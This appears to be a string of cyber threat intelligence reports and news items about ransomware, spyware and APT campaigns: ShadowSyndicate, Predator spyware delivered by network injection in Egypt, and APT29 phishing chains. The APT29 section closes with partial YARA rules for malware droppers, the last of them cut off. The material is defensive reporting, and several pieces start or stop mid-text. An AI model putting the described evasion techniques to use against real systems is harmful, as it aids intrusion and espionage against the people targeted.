      "text": " Security researchers have identified infrastructure belonging to a threat actor now tracked as ShadowSyndicate, who likely deployed seven different ransomware families in attacks over the past year.Group-IB analysts working together with Bridewell and independent researcher Michael Koczwara attribute with various degrees of confidence ShadowSyndicate's use of the Quantum, Nokoyawa, BlackCat/ALPHV, Clop, Royal, Cactus, and Play ransomware in multiple breaches observed since July 2022.Based on their findings, researchers believe that the threat actor could be an initial access broker (IAB), although evidence suggests that ShadowSyndicate is an affiliate to multiple ransomware operations.The researchers base their conclusions on a distinct SSH fingerprint they discovered on 85 IP servers, most of them tagged as Cobalt Strike command and control machines.\"We have dubbed the threat actor that uses the SSH fingerprint 1ca4cbac895fc3bd12417b77fc6ed31d ShadowSyndicate (previous name Infra Storm)\" - Group-IBThe analysts first saw the fingerprint on July 16, 2022, and it was still in use in August 2023.The team of researchers relied on various tools for their investigation, which included discovery engines like Shodan and Censys, along with various OSINT techniques. This allowed them to discover an extensive ShadowSyndicate activity footprint.Looking at the ShadowSyndicate servers identified based on the SSH fingerprint, the researchers \"came across eight different Cobalt Strike watermarks [license keys].\"The eight Cobalt Strike servers communicated with Cactus, Royal, Quantum, Nokoyawa, Play, Clop, and BlackCat/ALPHV ransomware deployed on various victim networks.The researchers also discovered Cobalt Strike configurations deployed on two servers, but only one of them on a machine featuring the ShadowSyndicate SSH fingerprint.Other tools seen in ShadowSyndicate attacks include the IcedID malware loader, the Matanbuchus MaaS loader, and the Meterpreter Metasploit payload.The analysts tested the hypothesis that all 85 servers with the same SSH key fingerprint linked to ShadowSyndicate are connected to a single hosting provider but found 18 different owners, 22 distinct network names, and 13 different locations.Analysis of Cobalt Strike C2 parameters like detection date, watermarks, or sleep time settings helped produce high-confidence evidence that links ShadowSyndicate to Quantum, Nokoyawa, and ALPHV/BlackCat ransomware.Specifically, the analysts linked the servers to a Quantum attack from September 2022, three Nokoyawa attacks from Q4 2022 and April 2023, and an ALPHV attack from February 2023.Group-IB and the mentioned collaborating parties has found additional evidence that connects ShadowSyndicate with less confidence to Ryuk, Conti, Trickbot, Royal, Clop, and Play malware operations.For Clop particularly, Group-IB's report mentions that at least 12 IP addresses formerly linked to the notorious ransomware operators were transferred to ShadowSyndicate since August 2022 and are now utilized for Cobalt Strike.Despite the many findings that suggest a potential connection, a high-confidence direct link between ShadowSyndicate and Clop remains elusive.Group-IB's intelligence experts conclude that ShadowSyndicate is likely an affiliate working with various ransomware-as-a-service (RaaS) operations. However, additional evidence is needed to support this theory.Nevertheless, this work is crucial in identifying and combating cybercrime, and in this spirit, the cyberintelligence firm invites external researchers to openly collaborate with them and help uncover the remaining obscure parts."

While the exact method of distributing the malware remains undisclosed, past instances of similar threats have often utilized SEO poisoning, adware bundles or email campaigns.ZenRAT initially appeared on a deceptive website closely resembling the legitimate Bitwarden site. This malicious website selectively displays a counterfeit Bitwarden download for Windows users while redirecting non-Windows users to a cloned opensource.com article. The installer file was initially reported on VirusTotal under a different name in late July 2023. The malware masquerades as “Piriform’s Speccy,” a gathering system specifications program, and pretends to bear the signature of Tim Kosse, a developer recognized for the Filezilla FTP/SFTP software.ZenRAT, which poses as ApplicationRuntimeMonitor.exe once launched, functions by gathering a wide range of system information upon execution, such as CPU and GPU details, operating system version, RAM, IP address, installed antivirus software and applications. This stolen data, along with browser information, is subsequently transmitted to a command-and-control (C2) server, employing a distinctive communication protocol.The communication process between ZenRAT and its C2 server is characterized by various command IDs, data sizes, hardware IDs, bot IDs, versions and builds. Notably, ZenRAT supports several commands, including transmitting logs, which reveal detailed system checks, geofencing, mutex creation, disk size verification and anti-virtualization measures. ZenRAT’s modular design implies potential for extending its capabilities, although, as of now, only the core functionality has been observed.“End users should be mindful of only downloading software directly from the trusted source, and always check the domains hosting software downloads against domains belonging to the official website,” reads the advisory."

However, it has now expanded its targeting scope to include financial institutions from the United States and multiple cryptocurrency apps.ThreatFabric explains that each Xenomorph sample is loaded with roughly a hundred overlays targeting different sets of banks and crypto apps, depending on the targeted demographic.Although the new Xenomorph samples aren't vastly different from previous variants, they come with some new features indicating that its authors continue to refine and enhance the malware.First, a new \"mimic\" feature can be activated by a corresponding command, giving the malware the capability to act as another application.Additionally, mimic​​ has a built-in activity named IDLEActivity, which acts as a WebView to display legitimate web content from the context of a trusty process.This system replaces the need to hide icons from the app launcher post-installation, which is flagged as suspicious behavior by most mobile security tools.Another new feature is \"ClickOnPoint,\", which allows Xenomorph operators to simulate taps at specific screen coordinates.This allows the operators to move past confirmation screens or perform other simple actions without employing the full ATS module, which might trigger security warnings.Finally, there's a new \"antisleep\" system that prevents the device from switching off its screen by means of an active notification.This is useful for prolonging the engagement and avoiding interruptions that require re-establishing command and control communications.By taking advantage of weak security measures from the malware operator, ThreatFabric analysts could access their payload hosting infrastructure.There, they discovered additional malicious payloads, including the Android malware variants Medusa and Cabassous, the Windows information stealers RisePro and LummaC2, and the Private Loader malware loader.Users should be cautious with prompts to update their browsers, as those are likely part of malware distribution campaigns.Xenomorph's distribution alongside potent Windows malware suggests collaboration between threat actors or the possibility of the Android trojan being sold as Malware-as-a-Service (MaaS)."

      "text": " Freelance JournalistA prolonged and ongoing cyber-espionage campaign by the threat actor known as EvilBamboo (formerly Evil Eye) has been uncovered by cybersecurity firm Volexity. This extensive operation is directed at Tibetan, Uyghur and Taiwanese individuals and organizations.Volexity’s monitoring efforts, spanning more than five years, have tracked the evolution of EvilBamboo’s activities. In September 2019, a reconnaissance framework and customized Android malware aimed at infiltrating Uyghur and Tibetan communities were observed. Further, in April 2020, EvilBamboo escalated its attacks by deploying a Safari exploit to implant iOS malware into the devices of Uyghur users. The content of a new report published by Volexity last Friday includes information from several reports sent to Volexity Threat Intelligence customers in June 2023 and presented at LABScon 2023.The advisory, written by Volexity researchers Callum Roxan, Paul Rascagneres and Thomas Lancaster, shows that EvilBamboo has been primarily targeting Taiwanese users by distributing the Android spyware BADBAZAAR through threads on a Taiwanese APK sharing forum since January 17 2023. These threads promote a cracked version of the Whoscall Android application, which assists in identifying spam calls and messages. The threat actor regularly updates the download link, leading victims to a Dropbox or Google Drive link.To support the distribution of its Android spyware, EvilBamboo has created counterfeit websites designed to distribute BADSIGNAL, a compromised version of the Signal app. The threat actor has also backdoored other applications like Telegram.EvilBamboo utilizes Telegram groups to share the latest versions of compromised applications. These groups cater to specific apps or categories, making it easier for users to download them.The threat actor also uses websites to load obfuscated profiling scripts, such as JMASK, which collects device information, lists Ethereum accounts and fingerprints the user’s browser. Another site shares a similar pattern with BADSOLAR and is actively promoted on Reddit and Twitter.“These campaigns largely rely on users installing backdoored apps, which highlights both the importance of only installing apps from trusted authors and the lack of effective security mechanisms to stop backdoored apps making their way onto official app stores.”"

      "title": "PREDATOR IN THE WIRES: Ahmed Eltantawy Targeted with Predator Spyware After Announcing Presidential Ambitions - The Citizen Lab",
      "text": " Eltantawy became suspicious about the safety of his phone and reached out to the Citizen Lab. We performed a forensic analysis on his device. Our forensic analysis showed numerous attempts to target Eltantawy with Cytrox’s Predator spyware.While working with Eltantawy, the Citizen Lab and Google’s Threats Analysis Group (TAG) obtained an iOS exploit chain that had been targeted at him. We initiated a responsible disclosure process with Apple, which assigned the following CVEs to vulnerabilities associated with the chain:CVE-2023-41991 (Security): A malicious app may be able to bypass signature validation.CVE-2023-41992 (Kernel): A local attacker may be able to elevate their privileges.CVE-2023-41993 (WebKit): Processing web content may lead to arbitrary code execution.On September 21, 2023, Apple released updates to multiple Apple products, which patches the vulnerabilities used by the exploit chain.Analysis of this chain is ongoing and we expect to publish a more extensive technical report in the future.The zero-day chain was hosted on sec-flare[.]com, and also contacted verifyurl[.]me. We fingerprinted these two websites (fingerprint F1 for sec-flare[.]com and F2 for verifyurl[.]me). We have identified a large number of IPs that matched our fingerprints, using Internet scanning. We consider all of these IPs (and the domain names returned in TLS certificates when they matched our fingerprints) to be linked to Cytrox’s Predator spyware. While we investigate further, we are not releasing the domain names or IP addresses at this time.Additionally, some of the domain names we identified appeared to be geared at targets in countries previously identified as Cytrox Predator customers, including Egypt, Greece, and Madagascar.In August and September 2023, when Eltantawy visited certain websites without HTTPS from his phone, using his Vodafone Egypt mobile data connection, he was silently redirected to a website (c.betly[.]me) via network injection. The domain betly[.]me matches our fingerprint F1 for Cytrox’s Predator spyware.The injection was triggered based on the website specified in the HTTP Host header, as well as the value of the User-Agent header. The following reply was injected by an on-path middlebox, and the legitimate reply from the server was suppressed:The body of the destination website included two iframes, ID “if1” which contained apparently benign bait content (in this case a link to an APK file not containing spyware) and ID “if2” which was an invisible iframe containing a Predator infection link hosted on sec-flare[.]com.We conducted a test to understand where in the network the injection happened. Ultimately, we were able to localize the injection to a link between Telecom Egypt and Vodafone Egypt. We cannot conclude from technical data alone whether the middlebox sits on the Telecom Egypt side or the Vodafone Egypt side of the link. However, we suspect that it is within Vodafone Egypt’s network, because precisely targeting injection at an individual Vodafone subscriber would require integration with Vodafone’s subscriber database.Also, given that the injection is operating inside Egypt, the spyware is sold to government agencies, and Egypt is a known Predator customer, it is highly unlikely that this targeting occurred and that this setup was established outside of the purview of Egyptian authorities.Typically, localizing the injection would involve sending packets from the targeted device (the “client”) with increasing IP “Time To Live” (TTL) values. Since each router that handles a packet subtracts one from the IP TTL value, packets expire when TTL reaches zero, and routers typically identify their IP addresses to the packet’s sender if they handle a sender’s expired packet, we could locate the routers on either side of the injector. The routers on either side of the injector would be: (1) the router which reports an expired packet containing the highest TTL value for which the injector does not respond, and (2) the router which reports an expired packet containing the lowest TTL value for which the injector does respond. We could then identify which network the IP addresses belong to by looking them up in an IP WHOIS database.However, this technique was not applicable to Eltantawy’s case because Vodafone Egypt’s network appears to have a separate middlebox close to subscribers that manages all TCP connections. This middlebox, which we suspect is used for benign traffic management, is located at approximately IP TTL = 4 from Eltantawy. Since the traffic management middlebox rewrites packets with fixed TTL values, we cannot control the TTL value beyond the traffic management middlebox. We were however able to determine that the spyware injection was not located anywhere up to TTL = 4 from Eltantawy.We identified two design choices in the injector, which, together, enabled us to localize the injection “in reverse”, from a measurement server we controlled. First, the injector attempts to mask its presence by copying IP TTL values it receives into packets it injects. Second, when injecting a response to a client “from” a server, the injector takes the server’s TTL to be the TTL from the first SYN/ACK it sees for a TCP connection, while ignoring TTL values in subsequent SYN/ACKs.Together, these two design choices allow us to use our measurement server to “prime” the injector to inject a TTL = 1 packet to the client. To do this, our measurement server responds to a SYN by sending a SYN/ACK that reaches the injector with TTL = 1, and then sending a follow-up SYN/ACK with somewhat higher TTL such that it reaches the traffic management middlebox, completes the connection, and causes the traffic management middlebox to send the HTTP GET request that triggers the injection.When the HTTP GET request reaches the injector, the injector sends a packet back to the client with TTL = 1. Because the injector is not directly adjacent to the client, the router immediately downstream from the injector will determine the packet is expired, and notify the sender of the injected packet. Because the injector spoofs the packet to come from our measurement server, the router identifies itself to us, notifying our measurement server of the packet’s expiry. This process is illustrated in Figure 2.We attribute the spyware injection in Egypt to Sandvine’s PacketLogic product with high confidence. Our attribution below has three parts.Characterizing the spyware injection in Egypt was challenging, because of the presence of the Traffic Management Middlebox on Vodafone Egypt’s network. This prevented us from seeing the raw packets sent by the spyware injector to Eltantawy’s device.Nevertheless, we were able to characterize the spyware injection in Egypt as follows:We conducted another measurement in September 2023, and found that the injection no longer matched our 2018 Sandvine PacketLogic fingerprint exactly, but was entirely consistent with the Egypt malware injection.As of September 2023, the Turk Telekom injector still matches an odd bug we observed with their Sandvine PacketLogic deployment in December 2020, which leads us to conclude that Turk Telekom is still using Sandvine PacketLogic. Specifically, Turk Telekom’s injector returns an injected (unencrypted) HTTP 307 Temporary Redirect message in response to a TLS Client Hello, which is an odd protocol violation.Because the Turk Telecom injector still shows highly compelling similarities to its past behavior when we attributed it to Sandvine PacketLogic, and because the Turk Telecom injector’s current behavior is fully consistent with the behavior of the Egypt spyware injector, we attribute the Egypt spyware injector to Sandvine PacketLogic with high confidence.Eltantawy additionally received several SMS messages in September 2021, May 2023, and September 2023 that posed as messages originating from WhatsApp.The fraudulent messages invited Eltantawy to visit an included link to “terminate” what the messages said was a new login to Eltantawy’s WhatsApp account. In reality, clicking the links would likely have infected Eltantawy’s phone with Cytrox’s Predator spyware.Interestingly, the domain names in the links do not match our F1 or F2 Predator fingerprint. However, approximately 2 minutes and 30 seconds after Eltantawy read the 15 September 2021 message, the Predator spyware was installed on his phone. We suspect that he clicked the message’s link, triggering the installation. Since the 2023 messages contain similar bait content, we believe these messages were also attempts to install the Predator spyware on his phone.We believe these websites are custom websites perhaps registered by a specific Predator customer. We believe that the following domain names are related:We translate the messages in Figure 4 below.This is Angie Raouf from FIDH organization for human rights.I was doing a case study on the elections in the middle east, and I wanted to ask you about [[ LINK ]] and whether there is harassment from the government towards the candidate Ahmed Tantawi.Thank you very muchIf you allow me, I would like to get the opinion of those opposed to the Egyptian regime as their point of view.At the beginning, I would like to start with an article written by Wael Qandeel, and what do you think of it [[ LINK ]]How do you think elections should be done, so it won’t become a comic play.I wanted elections even if it wasn’t fair or just, but sadly I can’t even see it as elections.I know that you are very busy, but I would be grateful if you could help me in my research.The use of mercenary spyware to target a senior member of a country’s democratic opposition after they had announced their intention to run for president is a clear interference in free and fair elections and violates the rights to freedom of expression, assembly, and privacy. It also directly contradicts how mercenary spyware firms publicly justify their sales.President el-Sisi has been widely condemned for his autocratic rule, and Egypt’s human rights abuses have been extensively documented. For any responsible company whose technology could be abused, the warning signs are clear. Yet, as evident in our report, insufficient due diligence was done to prevent these types of abuses by Cytrox or the other firms we have identified whose technology was employed to target and hack the device of Eltantawy.Our report also reveals the potential insecurities that run through the entire spectrum of the telecommunications ecosystem, including at the network layer, which can be exploited to inject malware on an unsuspecting users’ device. Our internet communications are routed through many networks and middleboxes, some of which can be mis-used for malicious purposes, particularly if network requests flowing through them are not protected with cryptography. Although great strides have been made in recent years to “encrypt the web”, users still occasionally visit websites without HTTPS, and a single non-HTTPS website visit can result in spyware infection. This report should serve as a reminder of the importance of achieving a 100% rate of HTTPS adoption.We urge everyone to immediately update their devices.Patched versions are: macOS Ventura 13.6, macOS Monterey 12.7, watchOS 9.6.3, watchOS 10.0.1, iOS 16.7 and iPadOS 16.7, iOS 17.0.1 and iPadOS 17.0.1.These two recent high profile cases underline the serious value that this security mode provides.Special thanks to Ahmed Eltantawy who chose to assist us in investigating his case. We would like to acknowledge his bravery in coming forward publicly. Without his collaboration, the discovery of these CVEs would not have been possible.Special thanks to Jakub Dalek, Jeff Knockel, and Adam Senft for assistance and review.Thanks to the entire team at Google TAG, especially Maddie Stone, for their collaboration in this investigation.Thanks to multiple teams at Apple for their rapid response and patch cycle.We’d also like to thank TNG."

Investigations into the group’s recent activity have identified an intensification of operations centered on foreign embassies in Ukraine. Notably, as part of this activity, we have seen phishing emails targeting a wide range of diplomatic representations in Kyiv including those of Moscow’s partners, representing the first time we have observed this cluster of APT29 activity pursuing governments strategically aligned with Russia. Based on the timing and focus of APT29’s Ukraine-focused operations, we judge they are intended to aid Russia’s Foreign Intelligence Service (SVR) in intelligence collection concerning the current pivotal phase of the war. APT29’s increased phishing activity in Ukraine has occurred alongside an uptick in the group’s more routine espionage operations against global diplomatic entities. Across these malware delivery operations, APT29 continues to prioritise European Ministries of Foreign Affairs and embassies, but it has also sustained operations that are global in scope and illustrative of Russia’s far-reaching ambitions and interests in other regions. The current secondary focus is concentrated in Asia, with governments in Türkiye (formerly known as Turkey), India, and other regions of vital strategic importance to Moscow such as Africa factoring into its 2023 priorities. We judge that Russia’s war in Ukraine has almost certainly shaped APT29’s espionage priorities, but it has not supplanted them. Alongside the increased pace of operations and changes in targeting, we have also seen a major shift in the group’s tooling and tradecraft. APT29 has rebuilt several of its tools and has made repeated iterative modifications to its existing malware delivery chain, likely to ensure its operational longevity despite long-term persistent use. We assess that several of these changes are highly likely specifically designed to sidestep research methods and tools commonly used by the threat intelligence community to track their operations, indicating that operational security priorities continue to factor heavily into APT29’s tooling decisions.ROOTSAW’s central and continued role in APT29 operations has spurred changes to the malware delivery chain over time. The most visible change has been the move away from HTML attachments as the initial infection vector, with APT29 shifting to hosting its first-stage payloads on compromised web services such as WordPress sites. Migrating the first-stage payload server side has likely provided APT29 a greater degree of control over its malware delivery chain and allowed the group to be more judicious about the exposure of its later-stage capabilities. For example, to prevent detection of malware in environments not intended for compromise, APT29 has implemented various forms of filtering in its first-stage payloads and has removed staged malware from compromised servers shortly after operational use. Notably, these efforts have also prevented payloads being acquired by public malware repositories and other common security research tools, helping to avoid detection and extend the operational lifespan of its newer malware variants. In March 2023, Mandiant identified a new APT29 phishing campaign targeting Türkiye. The phishing waves impersonated the Turkish Deputy Minister of Foreign Affairs and included a phishing link accompanied by content related to the February 2023 earthquake that struck southern Türkiye. In both waves, APT29 incorporated a new version of ROOTSAW with added user-agent based anti-analysis guardrails. This variant checks the user-agent of the device, looking for Windows operating systems that do not contain “.NET” and contain the value “Windows NT”. As a result, if the victim is running a non-Windows based operating system or the request is made through .NET, the server will deliver a decoy PDF file. In the second wave, this PDF file was identical to the version contained in the malicious ZIP payload. This filtering tactic is likely used to identify automated downloaders and non-compatible victim devices, further reducing the odds of exposing malware in non-compromise contexts. Each payload within the new ROOTSAW variant is obfuscated using a unique key, although the deobfuscation routine remains the same.In an additional phishing campaign in March 2023, APT29 targeted various diplomatic missions in Europe. Notably, in the two weeks that lapsed between the Turkey campaign, further changes were identified resulting in two new variants of ROOTSAW that shifted the newly added anti-analysis guardrails server side.In April 2023, APT29 continued to modify its standard malware delivery chain, introducing a new technique for malware delivery. In this operation, APT29 re-used one its frequent diplomatic event-themed lure documents spoofing the Czechia Embassy (more commonly known as the Czech Republic) that invited targets to a wine tasting event on April 13, 2023. The document contained a link to the phishing website “https://sylvio[.]com[.]br/form.php”, which delivered either an ISO or a ZIP archive to the victim. In May, in the lead up to Ukraine’s counteroffensive, APT29 conducted two distinct phishing waves targeting a wide range of diplomatic representations in Kyiv, including those of Moscow’s partners. Each campaign adopted separate intrusion chains similar to those seen in March and April 2023. In late June, Mandiant identified an additional APT29 phishing campaign with a new variant of ROOTSAW to target a European government. Phishing emails were sent from a compromised North American government email address and crafted to appear as an invitation to a public holiday celebration from Norwegian embassy personnel. Two different delivery mechanisms were used in this campaign, a PDF (MD5: b4141aa8d234137f0b9549a448158a95) containing a link to an actor-hosted ROOTSAW variant, and emails with an attached Scalable Vector Graphic (SVG) file (MD5: 295527e2e38da97167979ade004de880) rather than the typical HTML payload.In July, APT29 continued to experiment with new ROOTSAW delivery mechanisms and victim filtering capabilities in an operation deploying a new downloader ICEBEAT to target European diplomatic entities. Emails were sent purporting to be an invite from a non-specified German embassy for an Ambassador’s farewell reception. Of note, ICEBEAT’s use of the open source Zulip messaging platform for command and control (C2) follows a pattern of past APT29 downloaders using legitimate services for command and control including Dropbox, Firebase, OneDrive and Trello.Beyond the continued adaptation of APT29’s malware delivery chain, Mandiant has also observed dedicated efforts to update and evolve the group’s later-stage malware into multiple variations, increasing the quantity and quality of tooling used across its campaigns. At least six distinct downloaders have been identified during the first half of 2023: As noted in the June 2023 campaign, we have also witnessed APT29 operating various infection chains simultaneously within a single campaign, suggesting that distinct initial access operators or subteams may be operating in parallel to service different regional targets or espionage objectives. Although we have been unable to ascertain the specific logic behind decisions about which malware delivery approach to use or when to introduce new later-stage malware variants, we judge with low confidence that they are likely driven by mission-specific parameters such as targets or operational objectives.The increased scope and frequency of APT29's diplomatic-focused spear phishing campaigns in the first half of 2023 has compelled the initial access team to make repeated modifications to its long-standing malware delivery chain. Efforts to move capabilities server side, introduce anti-analysis components, and deliver decoy documents in non-compromise contexts have likely helped the group extend the shelf-life of its ROOTSAW-centred concept of operations. Even with this unprecedented pace of change, the group has remained highly operational security conscious, and has taken repeated steps to circumvent the methods that security researchers use to track and respond to its activity. APT29's increased operational tempo has also exposed patterns of operations that likely reflect different initial access operators or subteams supported by a centralized development team. More generally, these patterns likely reflect a growing mission and pool of resources dedicated to collecting political intelligence and that group will almost certainly continue to pose a high severity threat to governments and diplomatic entities globally.ATT&CK Tactic CategoryTechniquesResource DevelopmentInitial AccessExecutionPersistencePrivilege EscalationDefence EvasionDiscoveryCommand and ControlExfiltrationrule M_Dropper_BURNTBATTER_1{    meta:        author = \"Mandiant\"        date_created = \"2023/04/26\"        description = \"Searches for the custom chaskey implementation\"        version = \"1\"        weight = \"100\"        disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"    strings:        $chaskey_imp = {41 81 C8 20 20 20 20 41 81 F8 6B 65 72 6E}    condition:        any of them}rule M_Dropper_Donut_1{    meta:        author = \"Mandiant\"        date_created = \"2023-04-12\"        description = \"Detects the structure of the Donut loader\"        version = \"1\"        weight = \"100\"    condition:        uint8(0) == 0xE8 and uint32(1) == uint32(5) and uint8(uint32(1)+5) == 0x59}rule M_Downloader_STATICNOISE_1{    meta:        author = \"Mandiant\"        date_created = \"2023-04-14\"        description = \"Detects the deobfuscation algorithm and rc4 from STATICNOISE\"        version = \"1\"        weight = \"100\"    strings:        $ = {41 8A C8 48 B8 [8] 80 E1 07 C0 E1 03 48 D3 E8 41 30 04 10 49 FF C0}        $ = {80 E1 07 C0 E1 03 48 b8 [8] 48 D3 E8 30 04 17 48 FF C7 48 83 FF}        $ = {40 88 2C 3A 49 8B 02 88 0C 06 45 89 0B 44 89 03 4D 8B 0A}        $ = {4D 8B 0A 46 0F BE 04 0A 44 03 C1 41 81 E0 FF 00 00 80}    condition:        all of them}rule M_Dropper_MUSKYBEAT_1 {    meta:        author = \"Mandiant\"        date_created = \"2023-04-06\"        description = \"Detects the RC4 encryption algorithm used in MUSKYBEAT\"        version = \"1\"        weight = \"100\"        disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"    strings:        $ = {42 8A 14 04 48 8D ?? ?? ?? ?? ?? 8A C2 41 02 04 08 44 02 D0 41 0F B6 CA}        $ = {41 B9 04 00 00 00 41 B8 00 30 00 00 48 8B D3 33 C9}    condition:        all of them}rule M_Hunting_DaveShell_Dropper_1_2{    meta:        author = \"Mandiant\"        description = \"Detects Shellcode RDI projects from  https://github.com/monoxgas/sRDI/blob/master/ShellcodeRDI\"        disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"    strings:        $ep = {E8 00 00 00 00 59 49 89 C8 BA [4] 49 81 c0 [4] 41 b9 [4] 56 48 89 e6 48 83 ?? f0 48 83 ec 30 48 89 4c 24 ?? 48 81 c1 [4] c7 44 24 ??

      "text": " A novel and sophisticated backdoor malware named 'Deadglyph' was seen used in a cyberespionage attack against a government agency in the Middle East.The Deadglyph malware is attributed to the Stealth Falcon APT (aka Project Raven or FruityArmor), a state-sponsored hacking group from the United Arab Emirates (UAE).In a new report released at the LABScon cybersecurity conference, ESET researcher Filip Jurčacko shares analysis of the new modular malware and how it infects Windows devices.ESET does not have insight into the means of initial infection, but it is suspected that a malicious executable, possibly a program installer, is used.However, ESET obtained most of the components of the infection chain to paint a picture of how the malware operates and attempts to evade detection.Deadglyph's loading chain begins with a registry shellcode loader (DLL) that extracts code from the Windows registry to load the Executor (x64) component, which in turn loads the Orchestrator (.NET) component.Only the initial component exists on the compromised system's disk as a DLL file, minimizing the likelihood of detection.ESET says the loader will load the shellcode from the Windows Registry, which is encrypted to make analysis more challenging.As the DLL component is stored on the filesystem, it is more likely to be detected. Due to this, the threat actors utilized a homoglyph attack in the VERSIONINFO resource using distinct Greek and Cyrillic Unicode characters to mimic Microsoft's information and appear as legitimate Windows file.\"This method employs distinct Unicode characters that appear visually similar, but in this case not identical, to the original characters, specifically Greek Capital Letter San (U+03FA, Ϻ) and Cyrillic Small Letter O (U+043E, о) in Ϻicrоsоft Corpоratiоn.The Executor component loads AES-encrypted configurations for the backdoor, initializes the .NET runtime on the system, loads the .NET part of the backdoor, and acts as its library.Finally, the Orchestrator is responsible for command and control server (C2) communications, using two modules for the task, 'Timer' and 'Network.'If the backdoor fails to establish communications with the C2 server after a determined period, it triggers a self-removal mechanism to prevent its analysis by researchers and cybersecurity experts.The Deadglyph malware is modular, meaning it will download new modules from the C2 that contain different shellcodes to be executed by the Executor component.Using a modular approach allows the threat actors to create new modules as needed to tailor attacks, which can then be pushed down to victims to perform additional malicious functionality.These modules have Windows and custom Executor APIs at their disposal, with the latter offering 39 functions that make it possible to perform file operations, load executables, access Token Impersonation, and perform encryption and hashing.ESET believes there are nine to fourteen different modules but could only obtain three: a process creator, an info collector, and a file reader.The information collector uses WMI queries to feed the Orchestrator with the following information about the compromised system:The process creator is a command execution tool that executes specified commands as a new process and gives the result to the Orchestrator.The file reader module reads the content of files and passes it to the Orchestrator, while it also gives the operators the option to delete the file after reading.Although ESET was only able to uncover only a fraction of the malware's capabilities, it's clear that Stealth Falcon's Deadglyph is a formidable threat.Without detailed information regarding the initial infection, offering specific defense strategies against the malware is impossible.For now, defenders can rely on the existing IoCs released in the report."

      "text": " A stealthy advanced persistent threat (APT) tracked as Gelsemium was observed in attacks targeting a Southeast Asian government that spanned six months between 2022 and 2023.Gelsemium is a cyberespionage group operational since 2014, targeting government, education, and electronic manufacturers in East Asia and the Middle East.A new report by Palo Alto Network's Unit 42 reveals how a new Gelsemium campaign uses rarely seen backdoors linked to the threat actors with medium confidence.The initial compromise of Gelsemium targets was achieved via installing web shells, likely after exploiting vulnerabilities in internet-facing servers.Using those web shells, Gelsemium performed basic network reconnaissance, moved laterally via SMB, and fetched additional payloads.Those additional tools that help in lateral movement, data collection, and privilege escalation include OwlProxy, SessionManager, Cobalt Strike, SpoolFool, and EarthWorm.Cobalt Strike is a widely used penetration testing suite, EarthWorm is a publicly available SOCKS tunneler, and SpoolFool is an open-source local privilege escalation tool, so these three aren't specific to Gelsemium.However, the OwlProxy is a unique, custom HTTP proxy and backdoor tool Unit 42 reports Gelsemium used in a past attack targeting the Taiwanese government.In the latest campaign, the threat actor deployed an executable that saved an embedded DLL (wmipd.dll) to the breached system's disk and created a service that runs it.The DLL is a variant of OwlProxy, which creates an HTTP service that monitors incoming requests for specific URL patterns that hide commands.The researchers say that security products in the targeted system prevented OwlProxy from running, so the attackers reverted to using EarthWorm.The sample in the recent attack monitored incoming HTTP requests, looking for a specific Cookie field that carries commands for execution on the host.These commands concern uploading files to or from the C2 server, executing commands, launching apps, or proxying connections to additional systems.The proxy functionality within OwlProxy and SessionManager shows the threat actors' intention to use the compromised server as a gateway to communicate with other systems on the target network.In conclusion, Unit 42 notes Gelsemium's tenacity, with the threat actors introducing multiple tools and adapting the attack as needed even after security solutions stopped some of their backdoors."

      "text": " The City of Dallas, Texas, said this week that the Royal ransomware attack that forced it to shut down all IT systems in May started with a stolen account.Royal gained access to the City's network using a stolen domain service account in early April and maintained access to the compromised systems between April 7 and May 4.During this period, they successfully collected and exfiltrated 1.169 TB worth of files based on system log data analysis conducted by city officials and external cybersecurity experts.The gang also prepared the ransomware deployment phase by dropping Cobalt Strike command-and-control beacons across the City's systems. At 2 AM on May 3rd, Royal started deploying the ransomware payloads, using legitimate Microsoft administrative tools to encrypt servers.After detecting the attack, the City initiated mitigation efforts, taking high-priority servers offline to impede Royal's progress. Simultaneously, it started service restoration efforts with the help of teams of internal and external cybersecurity experts.The process of restoring all servers took just over 5 weeks, from May 9th, when the financial server was revived, to June 13th, when the last server affected by the attack, the waste management server, was restored.\"The OAG's website indicated that personal information such as names, addresses, social security information, health information, health insurance information, and other such information was exposed by Royal.\"So far, the Dallas City Council has set a budget of $8.5 million for ransomware attack restoration efforts, with the final costs to be shared later.Dallas is the fourth-largest metropolitan area and the ninth-largest City in the United States, with a population of roughly 2.6 million people.\"Wednesday morning, the City's security monitoring tools notified our Security Operations Center (SOC) that a likely ransomware attack had been launched within our environment. Subsequently, the City has confirmed that a number of servers have been compromised with ransomware, impacting several functional areas, including the Dallas Police Department Website,\" the City of Dallas explained in a statement issued on May 3rd.\"The City team, along with its vendors, are actively working to isolate the ransomware to prevent its spread, to remove the ransomware from infected servers, and to restore any services currently impacted. The Mayor and City Council was notified of the incident pursuant to the City's Incident Response Plan (IRP).\"Upon its launch in January 2022, Royal initially used encryptors from other ransomware operations, such as ALPHV/BlackCat, to avoid drawing attention. However, they subsequently began utilizing their own encryptor, Zeon, in their attacks throughout the year.The ransomware operation underwent a rebranding towards the end of 2022, adopting the name \"Royal\" and emerging as one of the most active ransomware gangs targeting enterprises.When the targets call the phone numbers embedded in emails camouflaged as subscription renewals, the attackers use social engineering to trick the victims into installing remote access software that provides the threat actors with access to their network."

      "text": " Security researchers discovered a multi-step information stealing campaign where hackers breach the systems of hotels, booking sites, and travel agencies and then use their access to go after financial data belonging to customers.By using this indirect approach and a fake Booking.com payment page, cybercriminals have found a combination that ensures a significantly better success rate at collecting credit card information.Typically, researchers observed info-stealer campaigns that targeted the hospitality industry (e.g. Hotels, travel agencies) using “advanced social engineering techniques” to deliver info-stealing malware.After establishing communication with the hotel, the criminals invoke a reason, such as a medical condition or a special request for one of the travelers, to send important documents via a URL.The URL leads to info-stealing malware that “is designed to operate stealthily” and collects sensitive data like credentials or financial info.In a new report this week, researchers at internet company Akamai say that the attack goes beyond the step described above and moves to target the customers of the compromised entity.“After the infostealer is executed on the original target (the hotel), the attacker can access messaging with legitimate customers” - Shiran Guez, information security senior manager at AkamaiHaving a direct and trusted communication channel with the final victim, cybercriminals can send their phishing message disguised as a legitimate request from the now-compromised hotel, booking service, or travel agency.The message asks for an additional credit card verification and relies on the common ingredients of a phishing text: requires immediate action and uses sound rationale to explain it.Guez notes that the message “is written professionally and modeled after genuine hotel interactions with their guests,” which eliminates all suspicion of a ploy.“It is important to remember that this message comes from within the booking site’s message platform itself,” the researcher highlights.Since the communication comes from the booking site through the official channel, the target has no reason to doubt its legitimacy.The researcher stresses that the script’s purpose is to detect information about the browsing environment and it is designed to make analysis significantly more 